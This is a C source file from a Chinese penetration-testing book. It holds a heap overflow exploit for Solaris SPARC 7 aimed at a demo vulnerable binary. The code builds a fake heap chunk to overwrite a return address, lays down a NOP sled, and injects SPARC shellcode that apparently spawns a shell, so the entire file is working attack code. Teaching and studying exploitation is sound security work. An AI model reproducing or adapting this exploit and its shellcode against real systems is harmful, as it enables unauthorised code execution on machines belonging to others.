/* exp.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对vul.c的堆溢出利用程序
*  测试环境：Solaris SPARC 7
*/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VUL         "./w3"
#define RETLOC      0xff33824c
#define SHADDR      0xffbeff58
#define NOP         0xac15a16e  /* xor %l5, %l5, %l5 */
#define NONEXT      0x20bfffff  /* bn,a    .-4       */

char shellcode[]=
"\x2d\x0b\xd8\x9a"
"\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda"
"\xec\x3b\xbf\xf0"
"\x90\x03\xbf\xf0"
"\xd0\x23\xbf\xf8"
"\xc0\x23\xbf\xfc"
"\x92\x03\xbf\xf8"
"\x94\x1a\x80\x0a"
"\x82\x10\x20\x3b"
"\x91\xd0\x20\x08"
;

#define ALIGN 8
typedef union _w_ {
    size_t w_i;
    struct _t_ * w_p;
    char w_a[ ALIGN ];
} WORD;
typedef struct _t_ {
    WORD t_s;
    WORD t_p;
    WORD t_l;
    WORD t_r;
    WORD t_n;
    WORD t_d;
} TREE;
#define BIT0 (01)
#define BIT1 (02)

/* prints a long to a string */
char* put_long(char* ptr, long value)
{
    *ptr++ = (char) (value >> 24) & 0xff;
    *ptr++ = (char) (value >> 16) & 0xff;
    *ptr++ = (char) (value >> 8) & 0xff;
    *ptr++ = (char) (value >> 0) & 0xff;

    return ptr;
}

int main(int argc, char *argv[])
{
    TREE    tree;
    int     align = 0;
    int     i;
    char    buf[2048];
    char    shellcode_buf[1024];
    char    *ptr;
    char    *args[] = {VUL, buf, NULL};
    char    *env[]  = {shellcode_buf, NULL};

    if (argc > 1) align  = atoi(argv[1]);

    /* construct fake chunk */
    memset( &tree, 0x41, sizeof(TREE) );
    tree.t_s.w_i = (-8 | BIT0) & ~BIT1;
    tree.t_p.w_i = SHADDR;
    tree.t_l.w_i = -1;
    tree.t_n.w_i = RETLOC - 8;

    memset(buf, 0, sizeof(buf));
    memset(buf, 0x41, 1024);
    memcpy(buf+1024, &tree, sizeof(TREE));

    /* construct shellcode buffer */
    memset(shellcode_buf, 0, sizeof(shellcode_buf));
    ptr = shellcode_buf;

    for (i = 0; i < align; i++) {
        *ptr++ = 0x41;
    }
    for (i = 0; i < 50; i++) {
        ptr = put_long(ptr, NONEXT);
        ptr = put_long(ptr, NOP);
    }
    strcat(shellcode_buf, shellcode);

    execve (args[0], args, env);
    return 0;
}
